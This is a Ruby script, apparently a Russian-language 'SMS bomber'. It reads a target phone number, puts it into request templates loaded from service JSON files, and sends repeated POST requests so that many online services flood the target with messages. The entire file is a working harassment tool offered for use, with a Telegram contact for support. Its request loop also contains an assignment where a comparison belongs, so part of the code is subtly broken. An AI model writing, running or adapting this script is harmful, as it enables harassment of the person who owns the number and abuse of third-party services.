require "net/http"
require "net/https"
require "json"

show_responce = true

puts "Внимание! Бомбер тестировался только с российскими номерами, нет возможности с украинскими. При возникновении любых ошибок пишите t.me/Upgradelifet"

print "Введите номер с +: "
phone = gets
phone = phone.gsub "\n", ""
phone_np = phone.sub "+", ""
 
print "Введите количество проходов: "
cycles = gets.to_i

method = []
name = []
body = []
url = []
kwph = [] 

services = Dir["services/*.json"]

services.size.times do |i|
  file = File.read services[i]
  services[i] = JSON.parse(file)
  
  method[i] = services[i]["method"]
  name[i] = services[i]["name"]
  url[i] = services[i]["url"]
  body[i] = services[i]["body"]
  kwph[i] = services[i]["key_with_phone"]

  case method[i]
  when "post_json"
  
    case body[i][kwph[i]]
    when "$phone_np"
      body[i][kwph[i]] = body[i][kwph[i]].sub "$phone_np", " #{phone_np}"
    when "$phone"
      body[i][kwph[i]] = body[i][kwph[i]].sub "$phone", "#{phone}"
    else
      puts "Ошибка подстановки номера. Проверьте сервис #{name[i]}"
      exit()
    end
    
  when "post"
  
    if url[i]["$phone_np"]
      url[i] = url[i].gsub "$phone_np", "#{phone_np}"
    elsif url[i]["$phone"]
      url[i] = url[i].gsub "$phone", phone
    else
      puts "Ошибка подстановки номера. Проверьте сервис #{name[i]}"
      exit()
    end
    
  else
    puts "Ошибка подстановки номера. Проверьте сервис #{name[i]}"
    exit()
    
  end
    
end

puts "Сервисов: #{services.size}"

for x in 1..cycles
  puts "Начинаю #{x} проход"
  services.size.times do |i|
    uri = URI.parse(url[i])
    https = Net::HTTP.new(uri.host,uri.port)
    https.use_ssl = true
    request = Net::HTTP::Post.new(uri.path)
    if method[i] = "post_json"
      request['Content-Type'] = 'application/json'
      request.body = body[i].to_json
    end
    result = https.request request
    
    if show_responce
      if result.body.size > 100
        puts "Запрос к #{name[i]} отправлен, ответ:"
        puts result
      else
        puts "Запрос к #{name[i]} отправлен, ответ:"
        puts result.body
      end
    end
    
  end
end
